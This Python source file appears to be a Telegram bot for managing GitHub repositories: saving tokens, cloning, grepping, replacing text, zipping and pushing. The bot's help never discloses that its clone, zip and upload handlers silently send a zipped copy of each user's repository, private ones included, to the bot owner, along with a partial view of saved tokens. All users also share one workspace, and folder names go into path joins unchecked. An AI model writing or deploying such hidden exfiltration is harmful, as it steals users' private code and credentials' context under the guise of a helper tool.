"""
╔══════════════════════════════════════════════════════╗
║         GitHub Control Bot  v3.1                    ║
║  Step-by-step flows • Folder Buttons • Bug Fixed    ║
╚══════════════════════════════════════════════════════╝

FIXES in v3.1:
  ✅ Grep: folder shown as TAP buttons — no typing needed
  ✅ All actions: step-by-step, never confused by emoji/text
  ✅ Replace/ZIP/Push: folder picker buttons
  ✅ Clone: handles public + private with clear prompts
  ✅ Edit repo: only changes the repo you selected
"""

import os
import re
from datetime import datetime
from pathlib import Path

from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)

import config
import database as db
import git_utils as git
from keyboards import (
    main_keyboard, repos_keyboard, repo_edit_keyboard,
    clone_type_keyboard, folder_picker
)

# ══════════════════════════════════════════════════════════════════════════════
app = Client(
    "github_bot_v31",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN,
)


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def utag(user) -> str:
    name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "Unknown"
    un   = f"@{user.username}" if user.username else "no username"
    return f"**{name}** ({un}) `[{user.id}]`"

def ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

async def alert_owner(client, text: str, doc: str = None):
    try:
        if doc and os.path.exists(doc):
            await client.send_document(config.OWNER_ID, doc, caption=text)
        else:
            await client.send_message(config.OWNER_ID, text)
    except Exception:
        pass

async def get_msg(source) -> Message:
    """Get Message object from either Message or CallbackQuery."""
    return source if isinstance(source, Message) else source.message


# ══════════════════════════════════════════════════════════════════════════════
#  /START
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("start") & filters.private)
async def cmd_start(client: Client, msg: Message):
    uid   = msg.from_user.id
    token = await db.get_token(uid)
    repos = await db.get_repos(uid)
    active = await db.get_active_repo(uid)

    active_name = ""
    for r in repos:
        if r["url"] == active:
            active_name = r.get("name") or git.repo_short(active)
            break

    text = (
        "👋 **Welcome to GitHub Control Bot v3.1**\n\n"
        f"🔐 Token: {'✅ Saved' if token else '❌ Not set'}\n"
        f"📦 Repos: {len(repos)} saved\n"
        + (f"🎯 Active: `{active_name}`\n" if active_name else "")
        + "\n**All actions work with buttons — no typing folder names!**\n\n"
        "👇 Choose an action:"
    )
    await msg.reply(text, reply_markup=main_keyboard())


# ══════════════════════════════════════════════════════════════════════════════
#  /HELP
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("help") & filters.private)
async def cmd_help(client: Client, msg: Message):
    await msg.reply(
        "📖 **GitHub Control Bot — Help**\n\n"
        "**Commands:**\n"
        "`/start` — Main menu\n"
        "`/token YOUR_TOKEN` — Save GitHub token\n"
        "`/list` — List workspace folders\n\n"
        "**How it works:**\n"
        "Every action is step-by-step:\n"
        "1. Tap button (e.g. 🔍 Grep All)\n"
        "2. Bot shows your workspace folders as buttons → tap folder\n"
        "3. Bot asks for search text → type it\n"
        "4. Done! ✅\n\n"
        "**Clone:**\n"
        "• Choose saved repo OR enter new URL\n"
        "• Pick: 🔐 with token OR 🌐 without token\n"
        "• Private repos need GitHub token\n\n"
        "**My Repos:**\n"
        "• 🔒/🔓 = private/public\n"
        "• ✅ = active (used for push/upload)\n"
        "• ✏️ → edit only THAT repo (URL/Name/Private)\n"
        "• 🗑 → delete that repo\n",
        reply_markup=main_keyboard(),
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /TOKEN  /LIST
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.command("token") & filters.private)
async def cmd_token(client: Client, msg: Message):
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        await msg.reply("Usage: `/token ghp_yourtoken`")
        return
    uid   = msg.from_user.id
    token = parts[1].strip()
    await db.set_token(uid, token)
    await msg.reply("✅ **GitHub token saved!**", reply_markup=main_keyboard())
    if uid != config.OWNER_ID:
        await alert_owner(client,
            f"🔐 **Token Set**\nUser: {utag(msg.from_user)}\n"
            f"Token: `{token[:8]}...{token[-4:]}`\nTime: {ts()}")


@app.on_message(filters.command("list") & filters.private)
async def cmd_list(client: Client, msg: Message):
    await msg.reply(git.list_workspace(), reply_markup=main_keyboard())


# ══════════════════════════════════════════════════════════════════════════════
#  CALLBACK ROUTER
# ══════════════════════════════════════════════════════════════════════════════

@app.on_callback_query()
async def cb(client: Client, q: CallbackQuery):
    uid  = q.from_user.id
    data = q.data
    await q.answer()

    # ─────────────────────────────────────────────────────────────────────────
    #  HOME
    # ─────────────────────────────────────────────────────────────────────────
    if data == "go_home":
        await db.clear_state(uid)
        token = await db.get_token(uid)
        repos = await db.get_repos(uid)
        await q.message.edit_text(
            f"🏠 **Main Menu**\n"
            f"🔐 Token: {'✅ Set' if token else '❌ Not set'}\n"
            f"📦 Repos: {len(repos)} saved",
            reply_markup=main_keyboard(),
        )

    # ─────────────────────────────────────────────────────────────────────────
    #  REPOS PANEL
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "show_repos":
        await _show_repos_panel(q, uid)

    elif data.startswith("repos_page:"):
        page = int(data.split(":")[1])
        kb   = await repos_keyboard(uid, page=page)
        await q.message.edit_reply_markup(reply_markup=kb)

    elif data.startswith("repo_select:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo = repos[idx]
            await db.set_active_repo(uid, repo["url"])
            name = repo.get("name") or git.repo_short(repo["url"])
            await q.message.reply(
                f"✅ **Active repo set:**\n📁 **{name}**\n`{repo['url']}`",
                reply_markup=main_keyboard(),
            )

    elif data.startswith("repo_edit:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo = repos[idx]
            name = repo.get("name") or git.repo_short(repo["url"])
            lock = "🔒 Private" if repo.get("is_private") else "🔓 Public"
            await q.message.reply(
                f"✏️ **Editing Repo #{idx+1}:**\n\n"
                f"🏷 Name: **{name}**\n"
                f"🔗 URL: `{repo['url']}`\n"
                f"Status: {lock}\n\n"
                "What to change?",
                reply_markup=repo_edit_keyboard(idx),
            )

    # Edit: Change URL
    elif data.startswith("re_url:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            await db.set_state(uid, {"action": "edit_url", "idx": idx})
            await q.message.reply(
                f"🔗 **Change URL for Repo #{idx+1}**\n"
                f"Current: `{repos[idx]['url']}`\n\n"
                "Send the **new GitHub repo URL:**"
            )

    # Edit: Change Name
    elif data.startswith("re_name:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            await db.set_state(uid, {"action": "edit_name", "idx": idx})
            cur = repos[idx].get("name") or git.repo_short(repos[idx]["url"])
            await q.message.reply(
                f"🏷 **Change Name for Repo #{idx+1}**\n"
                f"Current: **{cur}**\n\n"
                "Send the **new label/name:**"
            )

    # Edit: Toggle Private
    elif data.startswith("re_priv:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo     = repos[idx]
            new_priv = not repo.get("is_private", False)
            await db.update_repo(uid, idx, repo["url"], repo.get("name", ""), new_priv)
            status = "🔒 Private" if new_priv else "🔓 Public"
            await q.message.reply(
                f"✅ Repo #{idx+1} is now **{status}**",
                reply_markup=repo_edit_keyboard(idx),
            )

    # Delete Repo
    elif data.startswith("repo_del:"):
        idx     = int(data.split(":")[1])
        removed = await db.delete_repo(uid, idx)
        if removed:
            name  = removed.get("name") or git.repo_short(removed["url"])
            repos = await db.get_repos(uid)
            await q.message.reply(
                f"🗑 **Deleted:** `{name}`\n📦 Remaining: {len(repos)}",
                reply_markup=await repos_keyboard(uid) if repos else main_keyboard(),
            )

    # Add Repo
    elif data == "add_repo":
        await db.set_state(uid, {"action": "add_repo_url"})
        await q.message.reply(
            "➕ **Add New Repo**\n\n"
            "Send the GitHub repo URL:\n"
            "Example: `https://github.com/user/myrepo`"
        )

    # ─────────────────────────────────────────────────────────────────────────
    #  SET TOKEN (via button)
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_set_token":
        await db.set_state(uid, {"action": "set_token"})
        await q.message.reply(
            "🔐 Send your **GitHub Personal Access Token:**\n\n"
            "Get one at: `github.com/settings/tokens`\n"
            "_(Give `repo` scope for private repos)_"
        )

    # ─────────────────────────────────────────────────────────────────────────
    #  GREP — Step 1: show folder picker buttons
    # ─────────────────────────────────────────────────────────────────────────
    elif data in ("cmd_grep", "cmd_grep_py"):
        only_py = data == "cmd_grep_py"
        mode    = "grep_py" if only_py else "grep_all"
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply(
                "📂 **Workspace is empty!**\nClone a repo first.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📥 Clone Repo", callback_data="cmd_clone"),
                    InlineKeyboardButton("🔙 Back", callback_data="go_home"),
                ]])
            )
            return
        await q.message.reply(
            f"🔍 **Grep {'(.py files only)' if only_py else '(all files)'}**\n\n"
            "**Step 1:** Tap the folder to search in:",
            reply_markup=folder_picker(f"grep_folder:{mode}"),
        )

    # GREP — Step 2: folder selected via button → ask for search text
    elif data.startswith("grep_folder:"):
        # format: grep_folder:MODE:FOLDERNAME
        parts  = data.split(":", 2)
        mode   = parts[1]       # grep_all or grep_py
        folder = parts[2]       # actual folder name
        only_py = mode == "grep_py"
        directory = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(directory):
            await q.message.reply(f"❌ Folder `{folder}` not found.")
            return
        await db.set_state(uid, {"action": "grep_search", "folder": folder, "only_py": only_py})
        await q.message.reply(
            f"🔍 **Grep in** `{folder}`\n\n"
            "**Step 2:** Send the **text to search:**"
        )

    # ─────────────────────────────────────────────────────────────────────────
    #  REPLACE — Step 1: folder picker
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_replace":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty! Clone a repo first.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("📥 Clone", callback_data="cmd_clone"),
                    InlineKeyboardButton("🔙 Back", callback_data="go_home"),
                ]]))
            return
        await q.message.reply(
            "✏️ **Replace Text in .py files**\n\n"
            "**Step 1:** Tap the folder:",
            reply_markup=folder_picker("replace_folder"),
        )

    elif data.startswith("replace_folder:"):
        folder = data.split(":", 1)[1]
        directory = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(directory):
            await q.message.reply(f"❌ Folder `{folder}` not found.")
            return
        await db.set_state(uid, {"action": "replace_old", "folder": directory, "fname": folder})
        await q.message.reply(
            f"✏️ **Replace in** `{folder}`\n\n"
            "**Step 2:** Send the **text to find** (old text):"
        )

    # ─────────────────────────────────────────────────────────────────────────
    #  RENAME FOLDER — Step 1: folder picker
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_rename":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty!", reply_markup=main_keyboard())
            return
        await q.message.reply(
            "📁 **Rename Folder**\n\n"
            "**Step 1:** Tap the folder to rename:",
            reply_markup=folder_picker("rename_pick"),
        )

    elif data.startswith("rename_pick:"):
        folder = data.split(":", 1)[1]
        await db.set_state(uid, {"action": "rename_new", "old": folder})
        await q.message.reply(
            f"📁 Renaming: `{folder}`\n\n"
            "**Step 2:** Send the **new name:**"
        )

    # ─────────────────────────────────────────────────────────────────────────
    #  MAKE ZIP — Step 1: folder picker
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_zip":
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty!", reply_markup=main_keyboard())
            return
        await q.message.reply(
            "📦 **Make ZIP**\n\n"
            "Tap the folder to zip:",
            reply_markup=folder_picker("zip_do"),
        )

    elif data.startswith("zip_do:"):
        folder = data.split(":", 1)[1]
        src    = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(src):
            await q.message.reply(f"❌ Folder `{folder}` not found.")
            return
        zip_path = os.path.join(config.WORK_DIR, f"{folder}.zip")
        status = await q.message.reply(f"⏳ Zipping `{folder}`...")
        git.make_zip(src, zip_path)
        await status.edit_text(f"✅ ZIP created: `{folder}.zip`")
        await q.message.reply_document(
            zip_path,
            caption=f"📦 `{folder}.zip`",
            reply_markup=main_keyboard(),
        )
        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"📦 **ZIP Created**\nUser: {utag(q.from_user)}\n"
                f"Folder: `{folder}`\nTime: {ts()}", doc=zip_path)

    # ─────────────────────────────────────────────────────────────────────────
    #  UPLOAD ZIP → GITHUB — Step 1: folder picker
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_github_upload":
        token = await db.get_token(uid)
        if not token:
            await q.message.reply("❌ No GitHub token.\nUse `/token YOUR_TOKEN` first.")
            return
        active = await db.get_active_repo(uid)
        if not active:
            await q.message.reply(
                "❌ No active repo selected.\n"
                "Go to **📂 My Repos** → tap a repo name to set it active."
            )
            return
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty!", reply_markup=main_keyboard())
            return
        await q.message.reply(
            f"🐙 **Upload ZIP → GitHub**\n"
            f"🎯 Repo: `{active}`\n\n"
            "Tap the folder to zip & upload:",
            reply_markup=folder_picker("upload_do"),
        )

    elif data.startswith("upload_do:"):
        folder = data.split(":", 1)[1]
        src    = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(src):
            await q.message.reply(f"❌ Folder `{folder}` not found.")
            return
        token    = await db.get_token(uid)
        repo_url = await db.get_active_repo(uid)
        zip_path = os.path.join(config.WORK_DIR, f"{folder}.zip")
        status   = await q.message.reply("⏳ Zipping and uploading to GitHub...")
        git.make_zip(src, zip_path)
        result = git.upload_to_github(zip_path, token, repo_url)
        await status.edit_text(result)
        await q.message.reply_document(zip_path, caption=f"📦 `{folder}.zip`", reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"🐙 **GitHub Upload**\nUser: {utag(q.from_user)}\n"
                f"Repo: `{repo_url}`\nFolder: `{folder}`\nTime: {ts()}", doc=zip_path)

    # ─────────────────────────────────────────────────────────────────────────
    #  GIT PUSH — Step 1: folder picker
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_git_push":
        token = await db.get_token(uid)
        if not token:
            await q.message.reply("❌ No GitHub token.\nUse `/token YOUR_TOKEN` first.")
            return
        active = await db.get_active_repo(uid)
        if not active:
            await q.message.reply(
                "❌ No active repo.\nGo to **📂 My Repos** → tap a repo to set it active."
            )
            return
        folders = git.get_workspace_folders()
        if not folders:
            await q.message.reply("📂 Workspace empty!", reply_markup=main_keyboard())
            return
        await q.message.reply(
            f"🚀 **Git Push**\n"
            f"🎯 Repo: `{active}`\n\n"
            "Tap the folder to push:",
            reply_markup=folder_picker("push_do"),
        )

    elif data.startswith("push_do:"):
        folder    = data.split(":", 1)[1]
        directory = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(directory):
            await q.message.reply(f"❌ Folder `{folder}` not found.")
            return
        token    = await db.get_token(uid)
        repo_url = await db.get_active_repo(uid)
        status   = await q.message.reply(f"⏳ Pushing `{folder}` to GitHub...")
        result   = git.git_push(directory, token, repo_url)
        await status.edit_text(result)
        await q.message.reply("", reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"🚀 **Git Push**\nUser: {utag(q.from_user)}\n"
                f"Repo: `{repo_url}`\nFolder: `{folder}`\nTime: {ts()}")

    # ─────────────────────────────────────────────────────────────────────────
    #  CLONE
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_clone":
        repos = await db.get_repos(uid)
        rows  = []
        for i, r in enumerate(repos):
            lock  = "🔒" if r.get("is_private") else "🔓"
            label = (r.get("name") or git.repo_short(r["url"]))[:28]
            rows.append([InlineKeyboardButton(f"{lock} {label}", callback_data=f"clone_pick:{i}")])
        rows.append([
            InlineKeyboardButton("🔗 Enter New URL", callback_data="clone_new_url"),
            InlineKeyboardButton("🔙 Back",          callback_data="go_home"),
        ])
        await q.message.reply(
            "📥 **Clone Repo**\n\n"
            + ("Pick a saved repo or enter a new URL:" if repos else "Enter a GitHub repo URL:"),
            reply_markup=InlineKeyboardMarkup(rows),
        )

    elif data.startswith("clone_pick:"):
        idx   = int(data.split(":")[1])
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            repo = repos[idx]
            name = repo.get("name") or git.repo_short(repo["url"])
            lock = "🔒 Private" if repo.get("is_private") else "🔓 Public"
            await db.set_state(uid, {"action": "clone_ready", "url": repo["url"]})
            await q.message.reply(
                f"📥 **Clone:** `{name}`\n`{repo['url']}`\n{lock}\n\n"
                "How to clone?",
                reply_markup=clone_type_keyboard(),
            )

    elif data == "clone_new_url":
        await db.set_state(uid, {"action": "clone_enter_url"})
        await q.message.reply(
            "📥 Send the **GitHub repo URL:**\n"
            "Example: `https://github.com/user/myrepo`"
        )

    elif data == "clone_with_token":
        token = await db.get_token(uid)
        if not token:
            await q.message.reply(
                "❌ No GitHub token saved!\n\n"
                "Use `/token YOUR_TOKEN` to save it first, then clone again."
            )
            return
        state = await db.get_state(uid)
        url   = state.get("url")
        if not url:
            await q.message.reply("❌ Session expired. Tap Clone again.")
            return
        await _run_clone(client, q, uid, url, token=token)

    elif data == "clone_no_token":
        state = await db.get_state(uid)
        url   = state.get("url")
        if not url:
            await q.message.reply("❌ Session expired. Tap Clone again.")
            return
        await _run_clone(client, q, uid, url, token=None)

    # ─────────────────────────────────────────────────────────────────────────
    #  LIST / HELP
    # ─────────────────────────────────────────────────────────────────────────
    elif data == "cmd_list":
        await q.message.reply(git.list_workspace(), reply_markup=main_keyboard())

    elif data == "cmd_help":
        await q.message.reply("Use /help for details.", reply_markup=main_keyboard())


# ══════════════════════════════════════════════════════════════════════════════
#  CLONE RUNNER
# ══════════════════════════════════════════════════════════════════════════════

async def _run_clone(client, source, uid: int, repo_url: str, token: str | None):
    m      = re.search(r"/([^/]+?)(?:\.git)?$", repo_url)
    folder = m.group(1) if m else "cloned_repo"
    dest   = os.path.join(config.WORK_DIR, folder)

    msg_target = source if isinstance(source, Message) else source.message
    status = await msg_target.reply(f"⏳ Cloning `{folder}`...")

    ok, result = git.clone_repo(repo_url, dest, token=token)

    # Private repo detected — offer token clone
    if not ok and result == "NEEDS_TOKEN":
        await status.edit_text(
            f"🔒 **Private repo detected!**\n`{repo_url}`\n\n"
            "This repo requires a GitHub token.\n"
            "Make sure you saved your token with `/token YOUR_TOKEN`"
        )
        await db.set_state(uid, {"action": "clone_ready", "url": repo_url})
        await msg_target.reply(
            "Choose clone method:",
            reply_markup=clone_type_keyboard(),
        )
        return

    await status.edit_text(result)
    if not ok:
        return

    await db.clear_state(uid)

    # Auto-save to repo list
    added = await db.add_repo(uid, repo_url)
    if added:
        await msg_target.reply("📌 Repo auto-saved to your list!")

    # Auto-ZIP and send to user
    zip_path = os.path.join(config.WORK_DIR, f"{folder}.zip")
    git.make_zip(dest, zip_path)
    await msg_target.reply_document(
        zip_path,
        caption=f"📦 `{folder}.zip` — auto-zipped!",
        reply_markup=main_keyboard(),
    )

    # Alert owner with ZIP
    user = source.from_user
    if uid != config.OWNER_ID:
        await alert_owner(
            client,
            f"📥 **Clone Alert**\nUser: {utag(user)}\n"
            f"Repo: `{repo_url}`\nTime: {ts()}",
            doc=zip_path,
        )


# ══════════════════════════════════════════════════════════════════════════════
#  REPO PANEL HELPER
# ══════════════════════════════════════════════════════════════════════════════

async def _show_repos_panel(source, uid: int):
    repos  = await db.get_repos(uid)
    active = await db.get_active_repo(uid)
    kb     = await repos_keyboard(uid, page=0)

    if not repos:
        text = (
            "📂 **No repos saved yet.**\n\n"
            "Tap **➕ Add More** to add a repo,\n"
            "or **📥 Clone** to clone one first."
        )
    else:
        lines = []
        for i, r in enumerate(repos):
            lock = "🔒" if r.get("is_private") else "🔓"
            tick = " ✅" if r["url"] == active else ""
            name = r.get("name") or git.repo_short(r["url"])
            lines.append(f"`{i+1}.` {lock} **{name}**{tick}\n    `{r['url']}`")
        text = (
            f"📂 **Your Repos ({len(repos)}):**\n\n"
            + "\n\n".join(lines)
            + "\n\n✅ = active  |  🔒 = private  |  ✏️ = edit  |  🗑 = delete"
        )

    msg_target = source if isinstance(source, Message) else source.message
    await msg_target.reply(text, reply_markup=kb)


# ══════════════════════════════════════════════════════════════════════════════
#  MESSAGE HANDLER  (text input steps)
# ══════════════════════════════════════════════════════════════════════════════

@app.on_message(filters.private & ~filters.command(["start", "help", "token", "list"]))
async def msg_handler(client: Client, msg: Message):
    uid    = msg.from_user.id
    text   = (msg.text or "").strip()
    state  = await db.get_state(uid)
    action = state.get("action", "")

    # ── Set Token ─────────────────────────────────────────────────────────────
    if action == "set_token":
        await db.set_token(uid, text)
        await db.clear_state(uid)
        await msg.reply("✅ **GitHub token saved!**", reply_markup=main_keyboard())
        if uid != config.OWNER_ID:
            await alert_owner(client,
                f"🔐 **Token Set**\nUser: {utag(msg.from_user)}\n"
                f"Token: `{text[:8]}...{text[-4:]}`\nTime: {ts()}")

    # ── Add Repo URL ──────────────────────────────────────────────────────────
    elif action == "add_repo_url":
        if "github.com" not in text:
            await msg.reply("❌ Not a valid GitHub URL.\nTry: `https://github.com/user/repo`")
            return
        await db.set_state(uid, {"action": "add_repo_name", "url": text})
        await msg.reply(
            f"✅ URL: `{text}`\n\n"
            "Send a **short name/label** for this repo\n"
            "_(or send `-` to use default)_"
        )

    elif action == "add_repo_name":
        url  = state["url"]
        name = "" if text == "-" else text
        await db.set_state(uid, {"action": "add_repo_priv", "url": url, "name": name})
        await msg.reply(
            f"🔒 Is this repo **private**?\n`{url}`\n\n"
            "Reply `yes` = private, `no` = public:"
        )

    elif action == "add_repo_priv":
        url     = state["url"]
        name    = state.get("name", "")
        is_priv = text.lower() in ("yes", "y", "1", "true", "private")
        await db.add_repo(uid, url, name, is_priv)
        await db.clear_state(uid)
        repos = await db.get_repos(uid)
        lock  = "🔒 Private" if is_priv else "🔓 Public"
        await msg.reply(
            f"✅ **Repo added!**\n"
            f"📁 **{name or git.repo_short(url)}** — {lock}\n"
            f"`{url}`\n\n📦 Total: {len(repos)}",
            reply_markup=await repos_keyboard(uid),
        )

    # ── Edit Repo: URL ────────────────────────────────────────────────────────
    elif action == "edit_url":
        if "github.com" not in text:
            await msg.reply("❌ Invalid GitHub URL. Try again:")
            return
        idx   = state["idx"]
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            old = repos[idx]
            await db.update_repo(uid, idx, text, old.get("name", ""), old.get("is_private", False))
            await db.clear_state(uid)
            await msg.reply(
                f"✅ **URL updated for Repo #{idx+1}:**\n`{text}`",
                reply_markup=await repos_keyboard(uid),
            )

    # ── Edit Repo: Name ───────────────────────────────────────────────────────
    elif action == "edit_name":
        idx   = state["idx"]
        repos = await db.get_repos(uid)
        if 0 <= idx < len(repos):
            old = repos[idx]
            await db.update_repo(uid, idx, old["url"], text, old.get("is_private", False))
            await db.clear_state(uid)
            await msg.reply(
                f"✅ **Name updated for Repo #{idx+1}:**\n🏷 `{text}`",
                reply_markup=await repos_keyboard(uid),
            )

    # ── Clone: enter new URL ──────────────────────────────────────────────────
    elif action == "clone_enter_url":
        if "github.com" not in text:
            await msg.reply("❌ Invalid GitHub URL. Try again:")
            return
        await db.set_state(uid, {"action": "clone_ready", "url": text})
        await msg.reply(
            f"📥 Repo: `{text}`\n\nHow to clone?",
            reply_markup=clone_type_keyboard(),
        )

    # ── GREP: search text (after folder was selected via button) ─────────────
    elif action == "grep_search":
        folder    = state["folder"]
        only_py   = state.get("only_py", False)
        directory = os.path.join(config.WORK_DIR, folder)
        if not os.path.exists(directory):
            await msg.reply(f"❌ Folder `{folder}` not found.\n\n{git.list_workspace()}")
            await db.clear_state(uid)
            return
        await msg.reply(f"🔍 Searching `{text}` in `{folder}`...")
        result = git.grep_text(directory, text, only_py=only_py)
        await db.clear_state(uid)
        if len(result) > 3800:
            result = result[:3800] + "\n\n..._(truncated — too many results)_"
        await msg.reply(
            f"🔍 **Results for** `{text}` in `{folder}`:\n\n{result}",
            reply_markup=main_keyboard(),
        )

    # ── Replace: old text ─────────────────────────────────────────────────────
    elif action == "replace_old":
        await db.set_state(uid, {**state, "action": "replace_new", "old": text})
        await msg.reply(
            f"✏️ Find: `{text}`\n\n"
            "**Step 3:** Send the **replacement text** (new text):"
        )

    elif action == "replace_new":
        result = git.replace_text(state["folder"], state["old"], text)
        await db.clear_state(uid)
        await msg.reply(result, reply_markup=main_keyboard())

    # ── Rename: new name ──────────────────────────────────────────────────────
    elif action == "rename_new":
        result = git.rename_folder(state["old"], text)
        await db.clear_state(uid)
        await msg.reply(result, reply_markup=main_keyboard())

    # ── Fallback ──────────────────────────────────────────────────────────────
    else:
        await msg.reply(
            "👋 Use the buttons below or /start",
            reply_markup=main_keyboard(),
        )


# ══════════════════════════════════════════════════════════════════════════════
#  RUN
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"\n{'='*54}")
    print(f"  🤖 GitHub Control Bot v3.1")
    print(f"  📦 Workspace : {config.WORK_DIR}")
    print(f"  🗄  MongoDB   : {config.MONGO_URI[:35]}...")
    print(f"  👑 Owner     : {config.OWNER_ID}")
    print(f"{'='*54}\n")
    app.run()
